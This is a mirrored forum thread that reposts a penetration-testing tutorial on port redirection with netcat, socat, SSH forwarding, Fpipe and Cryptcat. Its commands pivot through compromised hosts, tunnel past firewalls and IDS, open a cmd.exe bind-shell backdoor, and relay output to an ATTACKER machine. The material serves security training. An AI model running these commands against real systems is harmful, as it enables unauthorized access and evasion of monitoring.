@@ -1,0 +1,265 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=23&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:53:55 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<base  /><!--[if IE]></base><![endif]-->
+	<meta name="generator" content="vBulletin 4.2.1" />
+
+	
+	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	
+
+
+
+	<title> Port Redirection Tools and Techniques</title>
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body>
+
+<div class="above_body">
+<div id="header" class="floatcontainer">
+<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+</div>
+</div>
+<div class="body_wrapper">
+<div id="pagetitle">
+	<h1><a href="showthread9084.html?t=23">Port Redirection Tools and Techniques</a></h1>
+	<p class="description">Printable View</p>
+</div>
+
+
+
+<ul id="postlist">
+	<li class="postbit blockbody" id="post_1">
+	<div class="header">
+		<div class="datetime">07-08-2010, 01:07 AM</div>
+		<span class="username">s1ayer</span>
+	</div>
+	
+	
+		<div class="title">Port Redirection Tools and Techniques</div>
+	
+	<div class="content">
+		<blockquote class="restore">&lt;Originally Posted by AnArKi&gt;<br />
+<br />
+This is the first in the Tool/Technique Of The Week (TOTW) series of posts covering methods used in information security as well as tools that I believe to be helpful. This weeks TOTW covers port redirection.<br />
+<br />
+When pen-testing there are a lot of ways that you can use port redirection to get around obstacles. You may want to leverage network access that you have obtained by compromising one system to attack another. Maybe, there is a service that you want to access but can't because it is being blocked by a firewall. Or there may be an intrusion detection system that you are trying to evade by sending traffic through an encrypted tunnel. Whatever the case, the following tools and techniques can assist you in accomplishing some of these goals.<br />
+<br />
+<b><font color="red">Netcat (nc)</font></b><br />
+Available for Windows and *nix.<br />
+<br />
+Netcat is one of those tools that has so many uses to a penetration tester that it is something that should always be in your toolkit. Taken from the Netcat project homepage:<br />
+<br />
+<i>&quot;Netcat is a featured networking utility which reads and writes data across network connections, using the TCP/IP protocol. It is designed to be a reliable &quot;back-end&quot; tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities.&quot;</i><br />
+<br />
+One way port redirection can be accomplished with Netcat on both Windows and *nix based systems. This only works if the application and protocol in use does not use control traffic to maintain an active connection. For example, lets say that you as the penetration tester (ATTACKER) have compromised and have direct access to HOST A on port 80/tcp only and have also compromised HOST B setting a bind shell to listen on port 23 but cannot access the host directly. There isn't any egress filtering for HOST B but HOST A cannot connect outbound on anything other than in response to established connections that it receives on port 80/tcp. (These command will work interchangeably on both Windows and *nix.) <br />
+<br />
+On your ATTACKER machine you would run to receive response traffic (window1):<br />
+<br />
+nc -lv 3333<br />
+<br />
+On HOST A you could run:<br />
+<br />
+nc -lv 80 | nc -t HOST B 23 | nc ATTACKER 3333<br />
+<br />
+And then netcat to HOST A on port 80/tcp (window2):<br />
+<br />
+nc HOST A 80<br />
+<br />
+You can then run commands from window2 and receive the command response on window1.<br />
+<br />
+Two way redirection can be accomplished using named pipes. Named pipes in Windows can only be created with code and do not work in the same way that named pipes in *nix work. You are much better off using something like Fpipe (see below) to achieve this same functionality. Lets go back to our previous example, but this time we would like to tunnel the command response traffic from HOST B back over the established connection that we initiated to HOST A on 80/tcp. (HOST A in this example must be running *nix.)<br />
+<br />
+On HOST A we create a named pipe using the mkfifo or mknod commands:<br />
+<br />
+#pipe will be the name of our named pipe<br />
+mkfifo pipe<br />
+<br />
+#this will perform the same action using mknod<br />
+mknod pipe p <br />
+<br />
+We then create our two way tunnel using Netcat on HOST A:<br />
+<br />
+nc -lvp 80 &lt;pipe | nc -t HOSTB 23 &gt;pipe<br />
+<br />
+In this case we can either use a standard telnet client (because we specified the -t option) or Netcat to initiate a connection to HOST A on port 80:<br />
+<br />
+telnet HOST A 80<br />
+<br />
+- or -<br />
+<br />
+nc -v HOST A 80<br />
+<br />
+We will then be able to issue commands and receive the command output in the same window.<br />
+<br />
+The two way port redirection technique can also be used to redirect traffic from one port to another on the same host. Example:<br />
+<br />
+#SSH into HOST A if sshd is listening on loopback<br />
+nc -lvp 80 &lt;pipe | nc localhost 22 &gt;pipe<br />
+<br />
+ssh -p 80 HOST A<br />
+<br />
+<br />
+<b><font color="red">Socat </font></b><br />
+<br />
+Socat is one of the best tools available for port redirection. Taken from Socat project site:<br />
+<br />
+<i>&quot;Socat is a relay for bidirectional data transfer between two independent data channels. Each of these data channels may be a file, pipe, device (serial line etc. or a pseudo terminal), a socket (UNIX, IP4, IP6 - raw, UDP, TCP), an SSL socket, proxy CONNECT connection, a file descriptor (stdin etc.), the GNU line editor (readline), a program, or a combination of two of these. These modes include generation of &quot;listening&quot; sockets, named pipes, and pseudo terminals.&quot; <br />
+</i><br />
+Socat's syntax takes a little bit of time to get used to, but once you overcome this mild obstacle the power of Socat will become obvious.<br />
+<br />
+Going back to our previous scenario, setting up a two way tunnel as we did with Netcat becomes trivial with Socat:<br />
+<br />
+socat TCP-LISTEN:80,fork TCP:HOSTB:23<br />
+<br />
+How about if an IDS is monitoring the traffic between HOSTA and HOSTB? If Socat is compiled with OpenSSL support we can generate certificates and encrypt the communications between the two hosts. We can also force validation of the client certificate to ensure that only HOSTA can connect to HOSTB via our Socat tunnel.<br />
+<br />
+First we have to generate a public/private key pair:<br />
+<br />
+openssl genrsa -out HOSTB.key 1024<br />
+  <br />
+Next self sign the certificate:<br />
+<br />
+openssl req -new -key HOSTB.key -x509 -out HOSTB.crt<br />
+  <br />
+Then generate the PEM encoded certificate by just concatenating the key and certificate files:<br />
+<br />
+cat HOSTB.key HOSTB.crt &gt; HOSTB.pem<br />
+<br />
+The PEM encoded certificate must then be copied to HOSTB. Perform the same certificate generation process for HOSTA (client), and copy the client PEM encoded certificate to HOSTA.<br />
+<br />
+Once your certificates have been generated and have been placed on the appropriate systems, all we need to do is setup the listener and the SSL tunnel.<br />
+<br />
+On HOSTA start socat with the following options:<br />
+<br />
+socat TCP-LISTEN:80, fork openssl-connect:HOSTB:8080,cert=HOSTA.pem,cafile=HOSTB.crt<br />
+<br />
+This will allow our ATTACKER machine to connect to port 80/tcp on HOSTA, and then initiate an SSL encrypted connection to HOSTB on port 8080/tcp.<br />
+<br />
+On HOSTB we set an OpenSSL listener on 8080/tcp to receive encrypted communications from HOSTA, decrypt this data, and forward it on to 23/tcp over the loopback adapter on HOSTB.<br />
+<br />
+socat openssl-listen:8080,reuseaddr,cert=HOSTB.pem,cafile=HOSTA.  crt,fork TCP:localhost:23<br />
+<br />
+I would highly suggest reviewing the Socat usage examples and the documentation that has been made available by the Socat project to see some of the other uses of this great tool.<br />
+<br />
+<br />
+<b><font color="red">SSH Client (ssh)</font></b><br />
+<br />
+SSH is a protocol that is largely used for the secure remote administration of systems via an encrypted tunnel. Outside of its basic terminal access uses, the OpenSSH client also has limited port forwarding capabilities that we can use for port redirection. This is a great benefit to us as a penetration tester for multiple reasons. Not only does SSH come installed by default in the majority of *nix based operating systems, but it also gives us channel encryption capabilities between any two systems in which we have authentication credentials (password, key, etc.).<br />
+<br />
+There are two different port forwarding types that can be used with the OpenSSH client, local and remote. Local port forwarding forwards traffic coming to a local port on the connecting machine to a specified remote port either on the machine that is being connected to or a system in which that system has network access. Remote port forwarding does the inverse, it forwards traffic coming to a remote port on the destination system, to a specified local port on the connecting system. Lets look at some examples.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_2">
+	<div class="header">
+		<div class="datetime">07-08-2010, 01:09 AM</div>
+		<span class="username">s1ayer</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Lets go back to our previous example, but this time we have ssh access to HOSTA. We can establish a two way tunnel between our ATTACKER system and HOSTB using nothing more than our ssh client and HOSTA acting as a connection intermediary.<br />
+<br />
+ssh -L 3333:HOSTB:23 username@HOSTA<br />
+<br />
+This will setup a local listener on our ATTACKER system on port 3333/tcp which will forward any traffic that it receives to HOSTB on port 23, via HOSTA. We can specify multiple local forwarders at the same time by including more -L options. If we had ssh connectivity to HOSTB we could bypass any IDS sensor that is in place using two ssh local forwards:<br />
+<br />
+ssh -L 3333:localhost:3333 username@HOSTA<br />
+<br />
+Then on HOSTA after logging in:<br />
+<br />
+ssh -L 3333:localhost:23 username@HOSTB<br />
+<br />
+Remote forwards are also really helpful when we have a service on our ATTACKER machine that we want to be able to access from a remote host, or provide connectivity between two systems using our ATTACKER host as a proxy. For example, ATTACKER2 is a system that is on our local network that we want to be able to access from HOSTA via 80/tcp so that we can browse our pen-testing toolkit.<br />
+<br />
+On ATTACKER we would connect to HOSTA with the following remote forward definition, we can then connect to 80/tcp via the loopback adapter on HOSTA to connect to ATTACKER2:<br />
+<br />
+ssh -R 80:ATTACKER2:80 username@HOSTA<br />
+<br />
+<br />
+<b><font color="red">Fpipe </font></b><br />
+<br />
+Fpipe is a tool that was created by Foundstone that allows us to perform port redirection on the Windows platform. Fpipe does not provide any native encryption abilities, but it does fill the two way tunnel gap due to the lack of named pipe support in Windows without having to install Cygwin.<br />
+<br />
+Going back to our scenario we could create a two way tunnel with Fpipe by issuing the following command on HOSTA:<br />
+<br />
+fpipe -l 3333 -r 80 HOSTB<br />
+<br />
+We would then be able to initiate a connection to HOSTA on port 3333/tcp which will be forwarded to HOSTB on 80/tcp. <br />
+<br />
+Fpipe also has functionality to set the source port of the connection using the &quot;-s&quot; option, which may be helpful in bypassing some weak firewall implementations.<br />
+<br />
+<br />
+<b><font color="red">Cryptcat</font></b><br />
+<br />
+Cryptcat is the standard GNU :cool:Netcat tool enhanced with twofish encryption which has ports for both WIndows and *nix.<br />
+<br />
+You can provide the same command line options with Cryptcat that you would with Netcat (see above), with the exception of some options that are used in relation to establishing the cryptographic tunnel. Most notable is the &quot;-k&quot; option, which allows us to specify a &quot;secret password&quot; (symmetric key) that will be used during encryption and decryption. I would always suggest setting a different key when using Cryptcat as the default is hard coded to &quot;metallica&quot;. The key will need to be set the same on both ends of the tunnel.<br />
+<br />
+We will need to use cryptcat on HOSTB to create our backdoor as the symmetric key will need to be defined to decrypt communications from HOSTA (not all versions of Cryptcat/Netcat support the -e option).<br />
+<br />
+cryptcat -k SECRETKEY -tlp 23 -e cmd.exe<br />
+<br />
+After creating our pipes as we did in the Netcat example we issue the following to create the two way tunnel on HOSTA<br />
+<br />
+cryptcat -k SECRETKEY -lp 80 &lt;pipe | cryptcat -k SECRETKEY -t HOSTB 23 &gt;pipe <br />
+<br />
+We can then create a local two way listener (after creating our named pipes) on our ATTACKER host to encrypt the communications to HOSTA, and initiate a telnet connection to our local forwarder:<br />
+<br />
+cryptcat -k SECRETKEY -lvp 23 &lt;pipe | cryptcat -k SECRETKEY -t HOSTA 80 &gt;pipe<br />
+<br />
+telnet localhost 23<br />
+<br />
+<b>credits:</b> <a href="../external.html?link=http://itsecops.blogspot.com/2009/08/totw-port-redirection-nc-socat-ssh.html" target="_blank">http://itsecops.blogspot.com/2009/08...socat-ssh.html</a></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_3">
+	<div class="header">
+		<div class="datetime">10-17-2012, 06:28 PM</div>
+		<span class="username">abhaythehero</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b>Firewall Piercing </b><br />
+<br />
+Excellent presentation about different techniques to bypass firewall mechanisms using tools like netcat,socat,ssh etc on different layers of TCP/IP model. &gt;&gt; <a href="../www.c3d2.de/media/firewallpiercing_21c3.pdf" target="_blank">www.c3d2.de/media/firewallpiercing_21c3.pdf</a></blockquote>
+	</div>
+</li>
+</ul>
+
+
+</div>
+<div class="below_body">
+<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:46 PM</span>.</div>
+
+<div id="footer_copyright" class="footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+</div>
+ 
+</div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=23&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:53:55 GMT -->
+</html>
